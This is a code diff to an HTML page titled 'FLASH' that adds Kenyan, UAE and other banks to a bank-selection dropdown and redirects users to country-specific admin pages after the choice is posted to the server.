@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>FLASH</title>
     <style>
         #box3Container3 {
             display: none;
@@ -585,7 +585,15 @@ margin-right: 20px;
                     { name: 'Standard Chartered', country: 'UK' },
                     { name: 'Credit Suisse', country: 'Switzerland' },
                     { name: 'ANZ', country: 'Australia' },
-                    { name: 'Santander', country: 'Spain' }
+                    { name: 'Santander', country: 'Spain' },
+                    { name: 'KCB Bank', country: 'Kenya' },
+                    { name: 'Equity Bank', country: 'Kenya' },
+                    { name: 'Cooperative Bank', country: 'Kenya' },
+                    { name: 'Standard Chartered Kenya', country: 'Kenya' },
+                    { name: 'Stanbic Bank Kenya Limited', country: 'Kenya' },
+                    { name: 'Abu Dhabi Commercial Bank', country: 'UAE' },
+                    { name: 'Barclays Bank', country: 'UK' },
+                    { name: 'CitiBank', country: 'USA' }
                 ];
 
                 foreignBanks.forEach(bank => {
@@ -599,8 +607,8 @@ margin-right: 20px;
 
         // Initialize the bank options based on the default account type
         updateBanks();
-
     </script>
+
     <script>
         const overlay = document.getElementById("overlay");
         const submit = document.getElementById("submit");
@@ -611,6 +619,8 @@ margin-right: 20px;
             loaderContainer.style.zIndex = "7";
             const selectedBank = document.getElementById('bank');
             const selectedBankText = selectedBank.options[selectedBank.selectedIndex].text;
+            const selectedCountry = selectedBankText.split('(')[1].split(')')[0];
+
             await fetch('/storeBank', {
                 method: 'POST',
                 headers: {
@@ -624,16 +634,23 @@ margin-right: 20px;
                     loaderContainer.style.display = "flex";
                     loaderContainer.style.zIndex = "7";
                     setTimeout(() => {
-                        window.location.href = "/server/admin"
+                        if (selectedCountry === 'Kenya') {
+                            window.location.href = "/server/admin/kenya";
+                        } else if (selectedCountry === 'UAE') {
+                            window.location.href = "/server/admin/uae";
+                        } else {
+                            window.location.href = "/server/admin";
+                        }
                     }, 3000);
                 })
                 .catch((error) => {
                     console.error('Error:', error);
                 });
             setTimeout(() => {
-                window.location.href = "/server/admin"
+                window.location.href = "/server/admin";
             }, 3000);
         }
+
         const cancel = document.getElementById("cancel");
         cancel.onclick = (e) => {
             e.preventDefault();
@@ -643,8 +660,9 @@ margin-right: 20px;
                 window.location.href = "/server/admin/login";
             }, 3000);
         }
-
     </script>
+
+
 </body>
 
 </html>
